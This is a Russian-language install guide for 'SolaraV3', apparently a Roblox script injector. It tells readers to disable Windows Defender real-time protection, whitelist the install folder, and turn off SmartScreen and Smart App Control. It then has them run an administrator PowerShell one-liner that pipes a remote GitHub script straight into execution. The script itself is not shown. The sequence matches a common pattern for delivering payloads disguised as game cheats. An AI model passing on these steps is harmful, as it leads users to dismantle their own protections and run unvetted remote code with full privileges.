# INSTALL — пошагово

## 0. Антивирус (обязательно)
1. `Параметры → Безопасность Windows → Защита от вирусов → Управление настройками → Защита в реальном времени → Выкл (временно)`
2. Ставь и запускай Solara первый раз
3. Добавь исключение: `... → Исключения → Добавить папку → C:\SolaraV3`
4. Включи защиту обратно

Без этого `SolaraV3.exe` исчезнет — так детектятся ВСЕ инжекторы.

## 1. Зависимости
- Windows 10/11 x64
- [.NET 8 Desktop Runtime x64](https://dotnet.microsoft.com/download/dotnet/8.0/runtime) — если Solara молча закрывается без окна, в 90% виноват он
- Официальный Roblox Player (не UWP из Microsoft Store)

## 2. Установка
Admin PowerShell:
```powershell
irm https://raw.githubusercontent.com/ChampionWand/SolaraV3/main/scripts/install.ps1 | iex
```
или вручную из [Releases](../../releases).

## 3. Запуск
1. Запусти Roblox → зайди в плейс → дождись движения персонажа
2. ПКМ по Solara → **Запуск от имени администратора**
3. Кнопка **Attach** → индикатор красный → зеленый
4. Вставь Lua или открой Script Hub → **Execute ▶**

## 4. SmartScreen / Smart App Control
- `SmartScreen: Нераспознанное приложение → Подробнее → Выполнить в любом случае` — норм для unsigned софта
- `Smart App Control` на Win11 блокирует без кнопки — `Параметры → Безопасность → Smart App Control → Выкл`, либо подпиши/исключи папку
